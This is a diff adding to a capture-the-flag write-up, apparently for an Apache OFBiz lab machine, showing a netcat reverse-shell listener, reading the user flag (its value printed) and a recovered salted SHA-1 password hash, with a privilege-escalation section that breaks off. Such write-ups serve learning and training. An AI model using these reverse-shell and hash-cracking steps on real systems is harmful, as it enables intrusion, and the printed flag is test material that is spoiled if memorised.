@@ -74,3 +74,37 @@ Subsequently, execute on a second terminal.
 ```bash
 nc -lnvp 4444
 ```
+
+
+then you will get user shell ....
+
+## User Flag :
+
+Upon successfully obtaining the reverse shell, navigating directories became a challenge. Fret not, as I've got you covered. Change the directory to /home/ofbiz, where you'll find a text file named user.txt. Simply execute 'cat' on the file, and voila! You've secured the user flag. 
+
+
+```bash
+ofbiz@bizness:/opt/ofbiz$ cd /home/ofbiz
+cd /home/ofbiz
+ofbiz@bizness:~$ ls
+ls
+user.txt
+ofbiz@bizness:~$ cat user.txt
+cat user.txt
+d96f0aefb0311de8c1da1c174db554d7
+```
+
+
+We successfully secured the User flag as 'd96f0aefb0311de8c1da1c174db554d7' However, the journey to the root flag is yet to be completed. No need to worry, though—I've got your back.
+
+Upon investigation, we uncovered the Derby database and a hash: '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN.' Breaking it down, '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN' signifies the use of the SHA-1 hashing algorithm ('$SHA$'), 'd' for salt, and the remaining string as the hashed value. Let's dive deeper into the data to uncover the next steps.
+
+
+## Privilege Escalation: Elevating System Access Safely 
+
+Execute this Python script to decode the SHA-1 hash.
+
+```bash
+$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN
+
+
